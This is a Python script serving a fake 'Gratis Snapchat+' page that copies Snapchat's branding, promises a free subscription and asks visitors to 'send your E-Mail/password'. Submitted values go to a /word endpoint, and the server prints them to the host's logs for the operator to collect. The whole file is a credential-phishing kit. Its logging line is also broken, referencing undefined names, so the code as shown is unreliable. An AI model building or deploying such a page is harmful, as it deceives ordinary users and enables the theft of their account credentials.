from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import urllib.parse
import os

# r""" ... """ (raw string), damit die Backslashes im JavaScript unverändert bleiben
HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Gratis Snapchat+</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#FFFC00">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='22' fill='%23FFFC00'/%3E%3Ctext x='50' y='72' font-size='60' text-anchor='middle'%3E%F0%9F%91%BB%3C/text%3E%3C/svg%3E">

<style>
:root{
  --yellow:#FFFC00;
  --ink:#16191C;
  --muted:#6B7280;
  --field:#F1F2F4;
  --blue:#0EADFF;
  --blue-dark:#0A94DE;
  --green:#18C964;
  --red:#FF3B5C;
  --safe-t:env(safe-area-inset-top,0px);
  --safe-b:env(safe-area-inset-bottom,0px);
}
*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
body{
  margin:0;
  background:var(--yellow);
  color:var(--ink);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,"Helvetica Neue",Arial,sans-serif;
  -webkit-font-smoothing:antialiased;
  overflow-x:hidden;
}

.stage{
  min-height:100%;
  min-height:100dvh;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:flex-end;
  padding-top:var(--safe-t);
  position:relative;
}
.hero{
  flex:1;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
  padding:28px 24px 20px;
  position:relative;
  z-index:1;
}
.ghost{
  width:clamp(110px,26vw,150px);
  height:auto;
  filter:drop-shadow(0 14px 0 rgba(0,0,0,.06));
  animation:float 3.2s ease-in-out infinite;
}
@keyframes float{
  0%,100%{transform:translateY(0) rotate(-2deg)}
  50%{transform:translateY(-12px) rotate(2deg)}
}
h1{
  margin:18px 0 6px;
  font-size:clamp(30px,6vw,40px);
  font-weight:800;
  letter-spacing:-.03em;
  line-height:1.05;
}
.subtitle{
  margin:0;
  font-size:16px;
  font-weight:500;
  color:rgba(22,25,28,.7);
}

.sheet{
  width:100%;
  max-width:520px;
  background:#fff;
  border-radius:32px 32px 0 0;
  padding:30px 24px calc(22px + var(--safe-b));
  box-shadow:0 -10px 40px rgba(0,0,0,.12);
  position:relative;
  z-index:2;
  animation:rise .7s cubic-bezier(.2,.9,.25,1) both;
}
@keyframes rise{
  from{transform:translateY(60px);opacity:0}
  to{transform:none;opacity:1}
}
.grab{
  width:42px;height:5px;border-radius:5px;background:#E3E5E8;margin:-14px auto 22px;
}

.field{margin-bottom:16px}
.field label{
  display:flex;
  justify-content:space-between;
  font-size:13px;
  font-weight:700;
  color:var(--muted);
  margin:0 4px 7px;
}
.field input,.field textarea{
  width:100%;
  display:block;
  background:var(--field);
  border:2px solid transparent;
  border-radius:16px;
  padding:15px 18px;
  font:inherit;
  font-size:17px;
  color:var(--ink);
  outline:none;
  resize:none;
  transition:border-color .15s,background .15s,box-shadow .15s;
}
.field textarea{min-height:112px;line-height:1.4}
.field input::placeholder,.field textarea::placeholder{color:#A3A8B0}
.field input:focus,.field textarea:focus{
  background:#fff;
  border-color:var(--blue);
  box-shadow:0 0 0 4px rgba(14,173,255,.18);
}

.btn{
  width:100%;
  border:0;
  border-radius:999px;
  padding:17px 24px;
  background:var(--blue);
  color:#fff;
  font:inherit;
  font-size:18px;
  font-weight:800;
  cursor:pointer;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:10px;
  transition:transform .12s,background .15s,box-shadow .15s,opacity .15s;
  box-shadow:0 8px 20px rgba(14,173,255,.35);
}
.btn:hover{background:var(--blue-dark)}
.btn:active{transform:scale(.97)}
.btn:disabled{
  background:#D5D9DE;
  box-shadow:none;
  cursor:not-allowed;
  color:#fff;
}
.btn.ghost-btn{
  background:var(--field);
  color:var(--ink);
  box-shadow:none;
}
.btn.ghost-btn:hover{background:#E6E8EB}
.btn:focus-visible{outline:3px solid var(--ink);outline-offset:2px}

.spin{
  width:20px;height:20px;border-radius:50%;
  border:3px solid rgba(255,255,255,.4);
  border-top-color:#fff;
  animation:spin .7s linear infinite;
  display:none;
}
.sending .spin{display:block}
@keyframes spin{to{transform:rotate(360deg)}}

#error{
  min-height:20px;
  margin:12px 4px 0;
  font-size:14px;
  font-weight:700;
  color:var(--red);
  text-align:center;
}

.done{display:none;text-align:center;padding:6px 0 4px}
.sent .done{display:block;animation:pop .45s cubic-bezier(.2,1.4,.4,1) both}
.sent form{display:none}
@keyframes pop{from{transform:scale(.85);opacity:0}to{transform:none;opacity:1}}
.check{
  width:84px;height:84px;margin:4px auto 16px;border-radius:50%;
  background:var(--green);
  display:grid;place-items:center;
  box-shadow:0 10px 24px rgba(24,201,100,.4);
}
.check svg{width:44px;height:44px}
.check path{
  stroke-dasharray:40;stroke-dashoffset:40;
  animation:draw .5s .2s ease forwards;
}
@keyframes draw{to{stroke-dashoffset:0}}
.done h2{margin:0 0 6px;font-size:24px;letter-spacing:-.02em}
.done p{margin:0 0 22px;color:var(--muted);font-size:16px;line-height:1.4}

.footer{
  margin-top:18px;
  text-align:center;
  font-size:12px;
  font-weight:600;
  color:#A3A8B0;
}

@media (min-width:700px){
  .stage{justify-content:center;padding:32px}
  .hero{flex:0;padding:0 0 28px}
  .sheet{border-radius:36px;padding:36px 34px 26px;box-shadow:0 30px 70px rgba(0,0,0,.18)}
  .grab{display:none}
}
@media (max-height:640px) and (max-width:699px){
  .hero{padding-top:12px;padding-bottom:10px}
  .ghost{width:84px}
  .subtitle{display:none}
}
@media (prefers-reduced-motion:reduce){
  *{animation-duration:.01ms!important;animation-iteration-count:1!important;transition:none!important}
}
</style>
</head>

<body>
<main class="stage" id="stage">

  <header class="hero">
    <svg class="ghost" viewBox="0 0 120 120" aria-hidden="true">
      <path d="M60 9C38 9 30 27 30 43v12c0 4-2 7-8 10-4 2-6 4-2 7 5 3 10 3 11 6 1 4-3 7 3 11 6 4 12 0 18 6 4 4 12 4 16 0 6-6 12-2 18-6 6-4 2-7 3-11 1-3 6-3 11-6 4-3 2-5-2-7-6-3-8-6-8-10V43C90 27 82 9 60 9Z"
            fill="#fff" stroke="#16191C" stroke-width="5" stroke-linejoin="round"/>
      <circle cx="48" cy="46" r="4.5" fill="#16191C"/>
      <circle cx="72" cy="46" r="4.5" fill="#16191C"/>
    </svg>
    <h1>Buraya Koy+</h1>
    <p class="subtitle">send your E-Mail/password</p>
  </header>

  <section class="sheet" id="sheet">
    <div class="grab" aria-hidden="true"></div>

    <form id="form" autocomplete="off" novalidate>
      <div class="field">
        <label for="user">Username</label>
        <input id="user" name="user" placeholder="Username" maxlength="60"
               autocapitalize="none" autocorrect="off" spellcheck="false">
      </div>

      <div class="field">
        <label for="word">Message <span id="count">0/300</span></label>
        <textarea id="word" name="word" placeholder="message" maxlength="300"></textarea>
      </div>

      <button class="btn" id="send" type="submit" disabled>
        <span class="spin"></span>
        <span id="sendText">Send</span>
      </button>
      <div id="error" role="alert"></div>
    </form>

    <div class="done" role="status" aria-live="polite">
      <div class="check">
        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M5 12.5l4.5 4.5L19 7.5"/>
        </svg>
      </div>
      <h2>Sent!</h2>
      <p>✅ Innerhalb von 24 Stunden wird es ankommen😄</p>
      <button class="btn ghost-btn" id="again" type="button">Send another</button>
    </div>

    <div class="footer">powered by Snapchat</div>
  </section>

</main>

<script>
(function(){
  var stage = document.getElementById("stage");
  var form = document.getElementById("form");
  var user = document.getElementById("user");
  var word = document.getElementById("word");
  var send = document.getElementById("send");
  var sendText = document.getElementById("sendText");
  var count = document.getElementById("count");
  var error = document.getElementById("error");
  var again = document.getElementById("again");

  function update(){
    count.textContent = word.value.length + "/300";
    send.disabled = !(user.value.trim() && word.value.trim());
  }
  user.addEventListener("input", update);
  word.addEventListener("input", update);

  word.addEventListener("keydown", function(e){
    if((e.ctrlKey || e.metaKey) && e.key === "Enter"){
      e.preventDefault();
      sendWord();
    }
  });

  form.addEventListener("submit", function(e){
    e.preventDefault();
    sendWord();
  });

  function sendWord(){
    if(send.disabled) return;
    error.textContent = "";
    send.disabled = true;
    stage.classList.add("sending");
    sendText.textContent = "Sending…";

    fetch("/word", {
      method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "user=" + encodeURIComponent(user.value.trim()) +
            "&word=" + encodeURIComponent(word.value.trim())
    })
    .then(function(r){
      if(!r.ok) throw new Error("bad status");
      stage.classList.add("sent");
      user.value = "";
      word.value = "";
    })
    .catch(function(){
      error.textContent = "❌ Error – check your connection and try again.";
    })
    .then(function(){
      stage.classList.remove("sending");
      sendText.textContent = "Send";
      update();
    });
  }

  again.addEventListener("click", function(){
    stage.classList.remove("sent");
    user.focus();
  });

  update();
})();
</script>
</body>
</html>
"""

PAGE = HTML.encode("utf-8")


class Handler(BaseHTTPRequestHandler):

    def _send(self, code, body=b"", ctype="text/plain; charset=utf-8"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        if path in ("/", "/index.html"):
            self._send(200, PAGE, "text/html; charset=utf-8")
        elif path == "/health":
            self._send(200, b"OK")
        else:
            self._send(404, b"Not found")

    do_HEAD = do_GET

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path
        if path != "/word":
            self._send(404, b"Not found")
            return

        length = min(int(self.headers.get("Content-Length", 0)), 10000)
        data = self.rfile.read(length).decode("utf-8", errors="replace")
        info = urllib.parse.parse_qs(data)

        username = info.get("user", [""])[0][:60]
        message = info.get("word", [""])[0][:300]

        # Erscheint im Render-Tab "Logs"
        print(f"NEW MESSAGE -> {E-Mail}: {password}", flush=True)

        self._send(200, b"OK")


port = int(os.environ.get("PORT", 8080))
server = ThreadingHTTPServer(("0.0.0.0", port), Handler)
print("Server running on port", port, flush=True)
server.serve_forever()
